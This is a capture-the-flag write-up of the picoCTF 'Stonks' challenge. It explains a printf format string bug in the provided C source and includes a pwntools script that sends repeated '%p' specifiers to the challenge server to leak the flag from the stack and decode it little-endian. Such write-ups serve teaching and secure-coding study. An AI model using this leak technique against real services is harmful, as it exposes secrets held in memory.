# Stonks — Format String Stack Disclosure

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn)  
* **Difficulty:** Easy (CyLab 2)  
* **Tools:** `file`, `checksec`, GDB with `pwndbg`, Python 3 (`pwntools`)  
* **Binary:** 32-bit ELF provided with source code `vuln.c`  

---

## TL;DR

A classic and clean introduction to **Format String Vulnerabilities**. The program reads an API token/flag from disk directly into a local stack buffer (`char api_buf[128]`), then passes user-controlled input directly to `printf(user_buf)` without a format specifier. By sending a string of `%p` specifiers, we force `printf` to walk upwards along the call stack and leak raw 32-bit memory words. Decoding these hexadecimal values from little-endian byte order recovers the flag in plaintext without needing any memory corruption.

---

## Student's Learning Note: Why `printf(buf)` is So Dangerous

In our freshman C programming classes, professors constantly nagged us: *"Always write `printf("%s", str);` instead of `printf(str);`!"* At the time, most of us wondered: *why does it matter if it prints the exact same text?*

This challenge was my personal eureka moment for understanding format string security:

1. **Variadic Functions in C:** In C, functions like `printf(const char *format, ...)` accept a variable number of arguments without runtime type metadata. `printf` trusts the format string completely. Every time it encounters `%p` or `%x`, it blindly grabs the next word from the stack (or argument registers), assuming the caller pushed an argument there.
2. **Walking the Stack Frame:** When we supply `%p.%p.%p...` as the format string itself, we turn `printf` into an arbitrary stack reader! It walks up the caller's stack frame, printing whatever data happens to live there—including local buffers, saved pointers, and secret keys.

---

## Source Code Review & Vulnerability

Looking into `vuln.c`:

```c
int buy_stonks(Portfolio *p) {
    char api_buf[FLAG_BUFFER]; // [Stack local variable]
    FILE *f = fopen("api", "r");
    if (!f) {
        printf("Flag file is missing. Please contact an admin.\n");
        exit(1);
    }
    fgets(api_buf, FLAG_BUFFER, f); // Reads the secret flag into api_buf on the stack!

    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);

    printf("Buying stonks with token:\n");
    printf(user_buf); // <-- CRITICAL VULNERABILITY: Missing format specifier!
    ...
}
```

Because `api_buf` is allocated on the stack frame of `buy_stonks()`, it sits directly in the path of `printf`'s variadic pointer dereferences.

---

## My Debugging Hurdle: The Little-Endian Reversal

When I first dumped the memory using `%p`, I received a stream of hex words like:
```text
0x64616361.0x7b796d65.0x306c5f49...
```

At first, converting these directly to ASCII gave me backwards nonsense:
* `0x64616361` $\rightarrow$ `'daca'`
* `0x7b796d65` $\rightarrow$ `'{yme'`

Then I remembered my Computer Architecture class on **byte ordering**:
> [!NOTE]
> **Little-Endian Architecture:**  
> On x86 processors, multi-byte integers store the least significant byte at the lowest memory address. When `printf("%p")` formats a 32-bit dword, it displays it in numerical order (MSB to LSB). To recover the string in memory order, each 4-byte chunk must be unpacked in little-endian order:
> * `0x64616361` $\rightarrow$ bytes `[0x61, 0x63, 0x61, 0x64]` $\rightarrow$ `"acad"`
> * `0x7b796d65` $\rightarrow$ bytes `[0x65, 0x6d, 0x79, 0x7b]` $\rightarrow$ `"emy{"`
> * `0x306c5f49` $\rightarrow$ bytes `[0x49, 0x5f, 0x6c, 0x30]` $\rightarrow$ `"I_l0"`

---

## Exploit Script

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Stonks
Exploit: Format String Stack Leak & Little-Endian Unpacking
"""

import re
from pwn import *

context.log_level = "error"

HOST = "xebec.cylabacademy.net"
PORT = 34149

def main():
    p = remote(HOST, PORT)

    # 1. Navigate menu: 1) Buy some stonks!
    p.recvuntil(b"2) View my portfolio")
    p.sendline(b"1")

    # 2. Send format string payload to dump stack values
    p.recvuntil(b"API token?")
    p.sendline(b".".join([b"%p"] * 100))

    data = p.recvall(timeout=5)
    p.close()

    # 3. Parse and decode hexadecimal leaked words
    decoded_bytes = b""
    for word in re.findall(rb"0x[0-9a-f]+|\(nil\)", data):
        if word == b"(nil)":
            decoded_bytes += b"\x00" * 4
        else:
            hex_val = int(word, 16)
            decoded_bytes += hex_val.to_bytes(4, "little")

    match = re.search(rb"[A-Za-z0-9_]{3,}\{[ -~]+\}", decoded_bytes)
    if match:
        print(f"[+] Flag found: {match.group(0).decode()}")
    else:
        print("[-] Flag not found in dump.")

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag

```text
academy{redacted}
```
*(Flag redacted in accordance with competition disclosure guidelines)*

---

## Key Takeaways & Lessons

1. **Never Pass Variable Strings as the First Argument to `printf`:** Always use `printf("%s", str);` to ensure the string content is treated strictly as data, not format directives.
2. **Understand Endianness in Leaked Words:** Data read as 32-bit words (`%x` / `%p`) appears in reverse byte order on little-endian processors when converted directly to characters.
3. **Format Strings Can Read and Write:** While this challenge only required memory disclosure (`%p`), format strings can also achieve arbitrary write primitives using `%n`.
